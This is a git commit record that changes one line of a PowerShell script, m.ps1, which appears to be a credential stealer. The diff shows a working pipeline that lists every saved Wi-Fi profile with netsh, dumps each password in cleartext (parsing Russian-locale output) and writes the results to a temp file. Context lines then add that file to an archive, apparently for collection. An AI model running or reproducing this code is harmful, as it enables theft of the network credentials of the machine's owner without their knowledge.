722d74d3f3852c475a561abf8b8faff607fe8faa
lol_are_you_gay <50666295+Kirill2045@users.noreply.github.com>
2021-08-17 12:59:14 +0300

    Update m.ps1

--- m.ps1
+++ m.ps1
@@ -34,7 +34,7 @@ for ($i=0; $i -lt 5; $i++){
   }
 }
 
-(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$n" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$p=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{E=$n;P=$p}} | Format-Table -AutoSize > $env:TEMP\w.txt
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$n" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$P=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{E=$n;P=$P}} | Format-Table -AutoSize > $env:TEMP\w.txt
 $w=$env:TEMP+'\w.txt'
 if("7"-in $arh)
   {Compress-Archive -Path $w -Update -CompressionLevel Fastest -DestinationPath $p}
